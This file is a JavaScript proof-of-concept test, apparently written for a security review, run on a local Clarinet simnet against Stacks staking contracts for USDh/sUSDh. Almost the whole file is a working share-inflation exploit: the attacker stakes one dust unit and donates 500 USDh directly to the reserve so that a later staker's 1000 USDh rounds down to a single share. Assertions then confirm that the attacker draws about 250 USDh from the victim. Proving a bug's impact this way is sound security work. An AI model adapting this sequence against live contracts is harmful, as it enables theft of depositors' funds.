import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const manifest = 'tests/security/standalone/Clarinet.toml';
const simnet = await initSimnet(manifest);
const accounts = simnet.getAccounts();
const deployer = accounts.get('deployer');
const trader = accounts.get('wallet_1');
const attacker = accounts.get('wallet_2');
const victim = accounts.get('wallet_3');

if (!deployer || !trader || !attacker || !victim) throw new Error('missing simnet accounts');

const BASE = 100_000_000n;
const ATTACKER_INITIAL_STAKE = 1n;
const DONATION = 500n * BASE;
const VICTIM_STAKE = 1_000n * BASE;
const c = (name) => `${deployer}.${name}`;
const stakingReserve = c('staking-reserve');
const stakingSilo = c('staking-silo');

function cv(result) {
  return cvToString(result.result);
}
function expectCv(label, result, expected) {
  const actual = cv(result);
  console.log(`${label}: ${actual}`);
  assert.equal(actual, expected, `${label}: expected ${expected}, got ${actual}`);
}
function ro(contract, method, args, sender = deployer) {
  return simnet.callReadOnlyFn(c(contract), method, args, sender);
}
function pub(contract, method, args, sender) {
  return simnet.callPublicFn(c(contract), method, args, sender);
}
function balance(token, who) {
  const r = ro(token, 'get-balance', [Cl.principal(who)]);
  console.log(`${token}.balance(${who}): ${cv(r)}`);
  return BigInt(r.result.value.value);
}

console.log('--- local production-contract setup ---');
expectCv('hq.set-contract-active(deployer)', pub('hq', 'set-contract-active', [Cl.principal(deployer), Cl.bool(true)], deployer), '(ok true)');
expectCv('hq.set-contract-active(staking-silo)', pub('hq', 'set-contract-active', [Cl.principal(stakingSilo), Cl.bool(true)], deployer), '(ok true)');
expectCv('minting-state.set-whitelist-enabled(false)', pub('minting-state', 'set-whitelist-enabled', [Cl.bool(false)], deployer), '(ok false)');
expectCv('minting-otc.set-trader', pub('minting-otc', 'set-trader', [Cl.principal(trader), Cl.bool(true), Cl.bool(false)], deployer), '(ok true)');

expectCv('fund attacker', pub('minting-otc', 'confirm-mint', [Cl.stringAscii('attack-fund'), Cl.principal(attacker), Cl.uint(ATTACKER_INITIAL_STAKE + DONATION), Cl.uint(BASE)], trader), '(ok true)');
expectCv('fund victim', pub('minting-otc', 'confirm-mint', [Cl.stringAscii('victim-fund'), Cl.principal(victim), Cl.uint(VICTIM_STAKE), Cl.uint(BASE)], trader), '(ok true)');

console.log('--- exploit ---');
expectCv('attacker dust stake', pub('staking', 'stake', [Cl.uint(ATTACKER_INITIAL_STAKE), Cl.none()], attacker), '(ok true)');
assert.equal(balance('susdh-token', attacker), 1n);
assert.equal(balance('usdh-token', stakingReserve), 1n);

expectCv('direct USDh donation to staking-reserve', pub('usdh-token', 'transfer', [Cl.uint(DONATION), Cl.principal(attacker), Cl.principal(stakingReserve), Cl.none()], attacker), '(ok true)');
assert.equal(balance('usdh-token', stakingReserve), 50_000_000_001n);

expectCv('ratio after donation', ro('staking', 'get-usdh-per-susdh', [], attacker), '(ok u5000000000100000000)');

expectCv('victim stakes 1000 USDh', pub('staking', 'stake', [Cl.uint(VICTIM_STAKE), Cl.none()], victim), '(ok true)');
assert.equal(balance('susdh-token', victim), 1n, 'victim should receive only one raw sUSDh share');
assert.equal(balance('usdh-token', stakingReserve), 150_000_000_001n);

expectCv('ratio after victim stake', ro('staking', 'get-usdh-per-susdh', [], attacker), '(ok u7500000000050000000)');

expectCv('attacker unstake', pub('staking', 'unstake', [Cl.uint(1n)], attacker), '(ok u1)');
assert.equal(balance('usdh-token', stakingSilo), 75_000_000_000n, 'attacker claim must immediately escrow 750 USDh');
assert.equal(balance('usdh-token', stakingReserve), 75_000_000_001n);

expectCv('victim unstake', pub('staking', 'unstake', [Cl.uint(1n)], victim), '(ok u2)');
assert.equal(balance('usdh-token', stakingSilo), 150_000_000_001n);
assert.equal(balance('usdh-token', stakingReserve), 0n);

// We do not need withdrawal to prove value capture: create-claim fixes the exact
// USDh amount and staking.transfer has already moved it out of the shared reserve.
// Mine through cooldown anyway to prove final realization.
simnet.mineEmptyBlocks(1_300);
expectCv('attacker withdraw claim', pub('staking-silo', 'withdraw', [Cl.uint(1n)], attacker), '(ok true)');
expectCv('victim withdraw claim', pub('staking-silo', 'withdraw', [Cl.uint(2n)], victim), '(ok true)');

const attackerPayout = balance('usdh-token', attacker);
const victimPayout = balance('usdh-token', victim);
const attackerCost = ATTACKER_INITIAL_STAKE + DONATION;
const attackerProfit = attackerPayout - attackerCost;
const victimLoss = VICTIM_STAKE - victimPayout;

console.log('--- exact economic delta ---');
console.log(`attacker cost raw:   ${attackerCost}`);
console.log(`attacker payout raw: ${attackerPayout}`);
console.log(`attacker profit raw: ${attackerProfit}`);
console.log(`victim deposit raw:  ${VICTIM_STAKE}`);
console.log(`victim payout raw:   ${victimPayout}`);
console.log(`victim loss raw:     ${victimLoss}`);

assert.equal(attackerPayout, 75_000_000_000n);
assert.equal(victimPayout, 75_000_000_001n);
assert.equal(attackerProfit, 24_999_999_999n);
assert.equal(victimLoss, 24_999_999_999n);
assert.equal(attackerProfit, victimLoss);

console.log('PASS: donation inflation transfers exactly 249.99999999 USDh from later staker to attacker.');
